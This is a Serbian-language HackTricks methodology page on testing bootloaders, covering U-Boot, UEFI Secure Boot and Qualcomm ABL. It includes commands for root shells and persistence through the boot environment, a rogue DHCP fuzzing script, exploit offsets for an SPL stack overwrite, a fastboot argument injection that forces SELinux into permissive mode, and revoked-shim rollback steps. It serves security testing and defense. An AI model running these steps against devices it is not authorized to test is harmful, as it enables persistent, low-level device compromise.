# Testiranje bootloader-a

{{#include ../../banners/hacktricks-training.md}}

Preporučuju se sledeći koraci za izmenu konfiguracija pokretanja uređaja i testiranje bootloader-a kao što su U-Boot i učitavači klase UEFI. Fokusirajte se na ostvarivanje izvršavanja koda u ranoj fazi, procenu zaštite potpisa/rollback-a i zloupotrebu putanja za oporavak ili mrežno pokretanje.

Povezano: zaobilaženje bezbednog pokretanja MediaTek-a pomoću patch-ovanja bl2_ext:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## Brze mogućnosti U-Boot-a i zloupotreba okruženja

1. Pristupite shell-u interpretera
   - Tokom pokretanja pritisnite poznati taster za prekid (često bilo koji taster, 0, razmak ili sekvencu „magic“ specifičnu za ploču) pre nego što se izvrši `bootcmd`, kako biste prešli na U-Boot prompt.<sup>[[1]](#references)</sup>

2. Pregledajte stanje pokretanja i promenljive
   - Korisne komande:
     - `printenv` (prikaže okruženje)
     - `bdinfo` (informacije o ploči, memorijske adrese)
     - `help bootm; help booti; help bootz` (podržani načini pokretanja kernela)
     - `help ext4load; help fatload; help tftpboot` (dostupni učitavači)

3. Izmenite argumente pokretanja da biste dobili root shell
   - Dodajte `init=/bin/sh` da bi se kernel prebacio na shell umesto na uobičajeni init:
     ```
     # printenv
     # setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
     # saveenv
     # boot    # or: run bootcmd
     ```

4. Netboot sa vašeg TFTP servera
   - Konfigurišite mrežu i preuzmite kernel/fit image sa LAN-a:
     ```
     # setenv ipaddr 192.168.2.2      # device IP
     # setenv serverip 192.168.2.1    # TFTP server IP
     # saveenv; reset
     # ping ${serverip}
     # tftpboot ${loadaddr} zImage           # kernel
     # tftpboot ${fdt_addr_r} devicetree.dtb # DTB
     # setenv bootargs "${bootargs} init=/bin/sh"
     # booti ${loadaddr} - ${fdt_addr_r}
     ```

5. Trajno sačuvajte promene putem okruženja
   - Ako env skladište nije zaštićeno od upisivanja, možete trajno zadržati kontrolu:
     ```
     # setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
     # saveenv
     ```
   - Proverite promenljive kao što su `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` koje utiču na rezervne putanje. Pogrešno podešene vrednosti mogu omogućiti ponovljene ulaske u shell.

6. Proverite funkcije za otklanjanje grešaka i nebezbedne funkcije
   - Potražite: `bootdelay` > 0, onemogućen `autoboot`, neograničen `usb start; fatload usb 0:1 ...`, mogućnost korišćenja `loady`/`loads` preko serijske veze, `env import` sa nepouzdanih medija i učitavanje kernela/ramdiskova bez provere potpisa.

7. Testiranje U-Boot image-a/provere
   - Ako platforma tvrdi da koristi secure/verified boot sa FIT image-ovima, isprobajte i nepotpisane i izmenjene image-ove:
     ```
     # tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
     # tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
     # tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
     ```
   - Odsustvo `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` ili legacy ponašanje `verify=n` često omogućava pokretanje proizvoljnih payload-ova.
   - Nemojte se zaustaviti na jednostavnom rezultatu dozvoljeno/odbijeno: nedavna istraživanja FIT-a pokazala su da sama putanja verifikacije može biti površina za napade pre autentifikacije. Testirajte negativne slučajeve sa eksterno uskladištenim FIT podacima (`data-offset`, `data-position`, `data-size`), izborom potpisane konfiguracije, `loadables` i rukovanjem overlay-ima / `extra-conf`.
   - Ako imate odgovarajuće izvorno stablo, `test/vboot/vboot_test.sh` je brz način da reprodukujete ponašanje FIT verifikacije u U-Boot sandbox-u pre nego što dirate stvarni hardver.<sup>[[10]](#references)</sup>

8. Standard Boot (`bootstd`), `extlinux` i script bootflows
   - U modernim U-Boot verzijama, `bootcmd` je često samo omotač oko Standard Boot-a. To znači da mediji na koje može da se upisuje, PXE ili SPI flash mogu postati stvarna granica poverenja, čak i kada vidljivo okruženje deluje bezazleno.
   - `extlinux` bootmeth traži `extlinux/extlinux.conf` u `/` i `/boot`; script bootmeth prvo traži `boot.scr.uimg`, a zatim `boot.scr`. Pri pokretanju preko mreže, ime script datoteke može da bude preuzeto iz `boot_script_dhcp`.
   - Korisne komande za trijažu:
     ```
     # bootflow scan -l
     # bootflow list
     # bootflow select 0; bootflow info -d
     # bootmeth list
     # bootmeth order "extlinux script pxe"
     ```
   - Slučajevi zloupotrebe za testiranje: USB/SD medij pod kontrolom napadača ranije u `boot_targets`, upisiv `/boot/extlinux/extlinux.conf`, zlonamerni TFTP koji isporučuje `boot.scr` ili izvršavanje skripte preko SPI-ja putem `script_offset_f`.
   - Ako se platforma oslanja na FIT verifikaciju, proverite da su konfiguracije potpisane na nivou konfiguracije, a ne samo za svaku sliku pojedinačno; `required-mode=all` je bezbedniji od prihvatanja bilo kog pojedinačnog obaveznog ključa.

### Eksterni FIT podaci u SPL-u kopirani pre verifikacije

Pri učitavanju FIT-a u SPL, ispravan potpis konfiguracije ne čini metapodatke eksternog sadržaja bezbednim. U-Boot izuzima `data-position`, `data-offset` i `data-size` iz potpisanih svojstava konfiguracije. U pogođenim putanjama `load_simple_fit()`, SPL određuje pomeraj izvora i dužinu kopiranja na osnovu tih polja, a zatim poziva `info->read()` **pre** provere hash-a slike. Zato prilagođeni FIT na upisivom mediju za pokretanje može da prepiše RAM bez falsifikovanja potpisa. Potpisano svojstvo `load` obično fiksira odredište, pa najpre utvrdite da li kopiranje prevelikog obima može sa te adrese da dosegne stek ili druge kontrolne podatke.<sup>[[15]](#references)[[16]](#references)</sup>

Pratite stvarni loader i mapu memorije ploče, umesto da pretpostavljate da se čita iz fleš memorije: demonstrirani RAM loader stigao je do `spl_ram_load_read()` i `memcpy()`. Na mestu poziva zabeležite `fit_offset` i svaku osnovnu adresu FIT-a koju čitalac doda, dužinu bloka loadera (`spl_get_bl_len(info)`), poravnanje specifično za fork, ako ga ima, rezultujuće vrednosti `read_offset` i veličinu prenosa `size`, odredište `src_ptr` i lokaciju sačuvane povratne adrese. Proverite da li kontinuirani mapirani izvorni region pokriva potrebnu udaljenost kopiranja, da li se preklapa sa odredištem i da li bajtovi na izvornoj poziciji mogu da daju pokazivač u FIT podatke pod kontrolom napadača. Generička [tehnika delimičnog prepisivanja povratne adrese](../../binary-exploitation/stack-overflow/ret2win/) primenljiva je ako pun pokazivač ne može da zadovolji ograničenja poravnanja loadera.<sup>[[16]](#references)</sup>

U istraživačkom 32-bitnom testnom buildu za AST2600, `src_ptr` je bio `0x80001000`, a sačuvana povratna adresa funkcije `memcpy` nalazila se na `0x902ffe24`. Koristili su upstream build izmenjen tako da koristi OpenBMC-ove pomoćne funkcije za pozicioniranje i poravnanje steka: RAM čitač je dodao osnovnu adresu FIT-a `0x10000`, a te pomoćne funkcije zaokružile su pomeraj izvora naniže na `ARCH_DMA_MINALIGN` (64 bajta). Koristan pokazivač u little-endian formatu na adresi `0x902fffe4` i kopiranje koje se završava jedan bajt ranije izmenili su samo najniža tri bajta sačuvane povratne adrese, uz očuvanje poznatog nultog najvišeg bajta. Nasuprot tome, upstream RAM loader koristi dužinu bloka od jednog bajta, pa ovo poravnanje od 64 bajta i zaobilazno rešenje sa delimičnim prepisivanjem nisu opšti zahtevi za SPL. Za svaki build ponovo izračunajte adrese, dužinu bloka loadera i obim kopiranja. U originalnom proračunu ispod, `fit_offset` označava efektivni dodatak osnovne adrese FIT-a koji uvodi RAM čitač, a ne nužno argument prosleđen funkciji `load_simple_fit()`.<sup>[[16]](#references)</sup>

```text
distance      = saved_return_slot - destination = 0x102fee24
data-position = pointer_slot - distance - fit_offset = 0x7fff11c0
data-size     = distance + 3 = 0x102fee27
```

Ispravka iz upstream-a ograničava i sirovu vrednost `data-size` i veličinu prenosa **poravnatu sa veličinom bloka** pre poziva `info->read()`. Putanja overlay-a prosleđuje stvarni kapacitet bafera, dok drugi pozivaoci koriste `CONFIG_SYS_BOOTM_LEN`, što je samo labava gornja granica, a ne dokaz da odredište ima toliko slobodne memorije. Pri proceni vendor fork-a proverite da li su te provere prisutne i uporedite dozvoljeni opseg kopiranja sa stvarnim SPL stekom ploče i rezervisanim regionima.<sup>[[15]](#references)[[16]](#references)</sup>

## Površina za mrežno pokretanje (DHCP/PXE) i lažni serveri

9. Fuzzing PXE/DHCP parametara
   - U-Boot-ova zastarela BOOTP/DHCP obrada imala je probleme sa bezbednošću memorije. Na primer, CVE‑2024‑42040 opisuje otkrivanje memorije preko posebno napravljenih DHCP odgovora, koji mogu da pošalju bajtove iz U-Boot memorije nazad preko mreže.<sup>[[4]](#references)</sup> Testirajte putanje koda za DHCP/PXE pomoću predugačkih vrednosti i graničnih slučajeva (opcija 67 `bootfile-name`, vendor opcije, polja `file`/`servername`) i pratite da li dolazi do zastoja ili curenja.
   - Minimalni Scapy isečak za testiranje parametara pokretanja tokom mrežnog pokretanja:
     ```python
     from scapy.all import *
     offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
              IP(src='192.168.2.1', dst='255.255.255.255')/
              UDP(sport=67, dport=68)/
              BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
              DHCP(options=[('message-type','offer'),
                            ('server_id','192.168.2.1'),
                            # Intentionally oversized and strange values
                            ('bootfile_name','A'*300),
                            ('vendor_class_id','B'*240),
                            'end']))
     sendp(offer, iface='eth0', loop=1, inter=0.2)
     ```
   - Takođe proverite da li se polja imena datoteka PXE-a prosleđuju shell/loader logici bez sanitizacije kada se ulančavaju sa provisioning skriptama na strani OS-a.

10. Testiranje command injection napada preko lažnog DHCP servera
   - Podesite lažni DHCP/PXE servis i pokušajte da ubacite znakove u polja imena datoteka ili opcija kako biste u kasnijim fazama lanca pokretanja došli do interpretera komandi. Metasploit-ov DHCP auxiliary, `dnsmasq` ili prilagođene Scapy skripte dobro rade. Najpre izolujte laboratorijsku mrežu.

## Režimi oporavka SoC ROM-a koji nadjačavaju normalno pokretanje

Mnogi SoC-ovi imaju režim „loader“ u BootROM-u koji prihvata kod preko USB/UART-a čak i kada su slike u flash memoriji nevažeće. Ako osigurači za secure boot nisu aktivirani, to može omogućiti proizvoljno izvršavanje koda veoma rano u lancu.

- NXP i.MX (Serial Download Mode)
  - Alati: `uuu` (mfgtools3) ili `imx-usb-loader`.
  - Primer: `imx-usb-loader u-boot.imx` za slanje i pokretanje prilagođenog U-Boot-a iz RAM-a.
- Allwinner (FEL)
  - Alat: `sunxi-fel`.
  - Primer: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` ili `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
  - Alat: `rkdeveloptool`.
  - Primer: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` za postavljanje loader-a i otpremanje prilagođenog U-Boot-a.

Procenite da li su eFuses/OTP za secure boot u uređaju upisani. Ako nisu, režimi preuzimanja BootROM-a često zaobilaze svaku verifikaciju na višem nivou (U-Boot, kernel, rootfs) tako što direktno izvršavaju vaš payload prve faze iz SRAM-a/DRAM-a.

## UEFI/PC bootloader-i: brze provere

11. Testiranje ESP neovlašćenih izmena, vraćanja na stariju verziju i upisa ključeva
   - Montirajte EFI System Partition (ESP) i proverite komponente loader-a: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, putanje do logotipa proizvođača.
   - Kada je moguće, preuzmite stanje Secure Boot-a i baze ključeva iz OS-a:
     ```bash
     mokutil --sb-state
     efi-readvar -v PK
     efi-readvar -v KEK
     efi-readvar -v db
     efi-readvar -v dbx
     ```
   - Ako je platforma u Setup Mode-u, prihvata upis ključeva bez autentifikacije ili se isporučuje sa testnim/podrazumevanim Platform Key-om (klasa PKfail), lokalni administrator ili fizički napadač može da upiše sopstveni KEK/db i ostavi utisak da je Secure Boot „omogućen“, dok istovremeno pokreće proizvoljne EFI binarne datoteke.<sup>[[3]](#references)</sup>
   - Pokušajte da pokrenete sistem sa starijim ili poznato ranjivim potpisanim komponentama za pokretanje ako revokacije Secure Boot-a (dbx) nisu ažurne. Ako platforma i dalje veruje starim shim-ovima/bootmanager-ima, često možete da učitate sopstveno jezgro ili `grub.cfg` sa ESP-a i uspostavite postojanost.
   - U Windows-u, zakrpljeni sistemi i dalje mogu da prihvataju ranjive potpisane boot manager-e ako potpisnik `Microsoft Windows Production PCA 2011` nije prisutan u firmware `dbx`, kao što je zabeleženo kod BlackX-a.<sup>[[13]](#references)[[14]](#references)</sup> Zaobilaženje tipa Baton Drop može da upiše napadačev MOK; legitimni shim zatim može da učita EFI payload potpisan tim ključem pri narednim pokretanjima.<sup>[[12]](#references)[[13]](#references)</sup> Naknadna revokacija starog Windows potpisnika ne uklanja upisani MOK, pa putanja zasnovana na shim-u može da opstane ako se tom shim-u i dalje veruje.<sup>[[12]](#references)</sup>
   - Pre testiranja ove rollback putanje na UEFI mašini za koju imate ovlašćenje, proverite **efektivno stanje revokacija u firmware-u**, a ne samo istoriju Windows ažuriranja.<sup>[[13]](#references)[[14]](#references)</sup> Microsoft nudi ovu read-only proveru u PowerShell-u sa povišenim privilegijama za potpisnik iz 2011. godine u `dbx`:<sup>[[14]](#references)</sup>
     ```powershell
     [System.Text.Encoding]::ASCII.GetString((Get-SecureBootUEFI dbx).Bytes) -match 'Microsoft Windows Production PCA 2011'
     ```
     `False` je samo trag: u laboratoriji sa mogućnošću oporavka potvrdite konkretnu potpisanu komponentu za pokretanje i druga opozivanja.<sup>[[12]](#references)[[14]](#references)</sup> Ažuriranje registra na čekanju ili istekao sertifikat za potpisivanje nisu isto što i dovršeno opozivanje pomoću `dbx`.<sup>[[13]](#references)[[14]](#references)</sup>

12. Testiranje zastarelih opozivanja shim / SBAT / dbx
   - Stari shim-ovi potpisani od Microsofta i fork-ovi proizvođača i dalje mogu da posluže kao putanja za bootkit u stilu BYOVD ako su opozivanja zastarela. U izolovanoj laboratoriji postavite istorijski ranjiv shim na ESP i pokušajte da chainload-ujete sopstveni `grubx64.efi` ili kernel.<sup>[[11]](#references)</sup>
   - Brza trijaža:
     ```bash
     sbverify --list shimx64.efi
     objdump -s -j .sbat shimx64.efi | less
     efibootmgr -v
     ```
   - Ako shim i dalje radi iako se nalazi na listi opoziva, firmware/OS ima zastarele `dbx` ispravke ili veruje fork-ovanom loader-u koji nikada nije nasledio upstream SBAT zaštite.

13. Greške u parsiranju logotipa pri pokretanju (klasa LogoFAIL)
   - Nekoliko firmware-a proizvođača OEM/IBV bilo je ranjivo na greške u parsiranju slika u DXE-u koje obrađuju logotipe pri pokretanju. Ako napadač može da postavi posebno napravljenu sliku na ESP, na putanju specifičnu za proizvođača (npr. `\EFI\<vendor>\logo\*.bmp`), pa zatim ponovo pokrene uređaj, moguće je izvršavanje koda tokom ranog pokretanja čak i kada je Secure Boot omogućen. Proverite da li platforma prihvata logotipe koje dostavi korisnik i da li se te putanje mogu menjati iz OS-a.<sup>[[2]](#references)</sup>


## Android/Qualcomm ABL + GBL (Android 16) trust gaps

Na uređajima sa Androidom 16 koji koriste Qualcomm ABL za učitavanje **Generic Bootloader Library (GBL)**, proverite da li ABL **autentifikuje** UEFI app koju učitava sa particije `efisp`. Ako ABL proverava samo **prisustvo** UEFI app-а, a ne i njen potpis, mogućnost upisivanja u `efisp` omogućava **izvršavanje непотписаног koda pre pokretanja OS-a**.<sup>[[6]](#references)[[7]](#references)</sup>

Praktične provere i načini zloupotrebe:

- **efisp write primitive**: Potreban vam je način da upišete prilagođenu UEFI app u `efisp` (root/privilegovana usluga, greška u OEM app-u, putanja kroz recovery/fastboot). Bez toga, propust u učitavanju GBL-a nije direktno dostupan za iskorišćavanje.<sup>[[6]](#references)</sup>
- **fastboot OEM argument injection** (greška u ABL-u): Neke verzije prihvataju dodatne tokene u `fastboot oem set-gpu-preemption` i dodaju ih u kernel cmdline. Ovo se može iskoristiti za prinudno postavljanje SELinux-a u permissive režim, čime se omogućava upisivanje u zaštićene particije:
  ```bash
  fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
  ```
  Ako je uređaj zakrpljen, komanda treba da odbaci dodatne argumente.<sup>[[5]](#references)[[6]](#references)</sup>
- **Otključavanje bootloader-a putem trajnih zastavica**: Payload u fazi pokretanja može da promeni trajne zastavice za otključavanje (npr. `is_unlocked=1`, `is_unlocked_critical=1`) i tako emulira `fastboot oem unlock` bez provera OEM servera/odobrenja. Ovo je trajna promena stanja nakon sledećeg ponovnog pokretanja.<sup>[[6]](#references)</sup>

Napomene za odbranu/trijažu:

- Potvrdite da li ABL vrši proveru potpisa nad GBL/UEFI payload-om iz `efisp`. Ako ne, tretirajte `efisp` kao površinu visokog rizika za postojanost.
- Pratite da li su ABL fastboot OEM rukovaoci izmenjeni tako da **proveravaju broj argumenata** i odbacuju dodatne tokene.<sup>[[8]](#references)[[9]](#references)</sup>

## Oprez pri radu sa hardverom

Budite oprezni pri radu sa SPI/NAND flash memorijom tokom ranog pokretanja (npr. uzemljavanje pinova radi zaobilaženja čitanja) i uvek konsultujte tehnički list flash memorije. Kratki spojevi u pogrešnom trenutku mogu da oštete uređaj ili programator.

## Napomene i dodatni saveti

- Isprobajte `env export -t ${loadaddr}` i `env import -t ${loadaddr}` za premeštanje blob-ova okruženja između RAM-a i skladišta; neke platforme omogućavaju uvoz env-a sa prenosivog medija bez autentifikacije.
- Za postojanost na sistemima zasnovanim na Linux-u koji se pokreću preko `extlinux.conf`, često je dovoljno izmeniti liniju `APPEND` (ubacivanjem `init=/bin/sh` ili `rd.break`) na particiji za pokretanje ako se ne sprovode provere potpisa.
- Ako cilj koristi ažuriranja sa dva slota / A/B, pregledajte tehnike protiv vraćanja na stariju verziju i desinhronizacije slotova u [pregledu analize firmware-a](README.md) kako ne biste propustili nedostatke poverenja prisutne samo u programu za ažuriranje, izvan samog bootloader-a.
- Ako korisnički prostor nudi `fw_printenv/fw_setenv`, proverite da li se `/etc/fw_env.config` podudara sa stvarnim skladištem env-a. Pogrešno podešeni pomaci omogućavaju čitanje/upisivanje u pogrešan MTD region.

## References

- [1] [Metodologija testiranja bezbednosti firmware-a](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [2] [Otkrivanje LogoFAIL-a: Opasnosti parsiranja slika tokom pokretanja sistema](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [3] [PKfail: Nepouzdani ključevi platforme ugrožavaju Secure Boot u UEFI ekosistemu](https://www.binarly.io/blog/pkfail-untrusted-platform-keys-undermine-secure-boot-on-uefi-ecosystem)
- [4] [Detalji o CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [5] [Preduhitreni: Otključavanje Xiaomi uređaja pomoću dva nesanitizovana niza](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [6] [Eksploatacija Qualcomm Snapdragon 8 Elite GBL-a omogućava napadačima da otključaju bootloader-e](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [7] [Arhitektura Generic Bootloader-a (GBL)](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [8] [QcomModulePkg: Ispravka prosleđivanja nepouzdanog unosa u komandnu liniju kernela](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [9] [QcomModulePkg: Dodavanje provere za komandu set-hw-fence-value](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [10] [Nespreman za pokretanje: Zaobilaženje provere potpisa FIT-a u U-Boot-u](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [11] [Obaveštenje o ranjivosti VU#616257 - Microsoft-potpisani UEFI shim bootloader-i ranjivi na zaobilaženje Secure Boot-a](https://kb.cert.org/vuls/id/616257)
- [12] [UEFI bootkit BlackLotus: Mit je potvrđen](https://www.welivesecurity.com/2023/03/01/blacklotus-uefi-bootkit-myth-confirmed/)
- [13] [BlackX: UEFI bootkit nalik BlackLotus-u](https://securelist.com/uefi-bootkit-blackx/121539/)
- [14] [Kako upravljati opozivima Windows Boot Manager-a za promene u Secure Boot-u](https://support.microsoft.com/en-us/servicing/os/windows/2023/03/how-to-manage-the-windows-boot-manager-revocations-for-secure-boot-changes-associated-with-cve-2023)
- [15] [Zakrpa za U-Boot: Ograničavanje veličine spoljašnjih podataka pre njihovog čitanja](https://github.com/u-boot/u-boot/commit/8f71d7170f5c3abadee45683e35ae6d925b6d417)
- [16] [Skriveni beneFIT-i: Zaobilaženje provere potpisa u U-Boot SPL-u](https://www.binarly.io/blog/signature-verification-bypass-in-u-boot-spl)
{{#include ../../banners/hacktricks-training.md}}
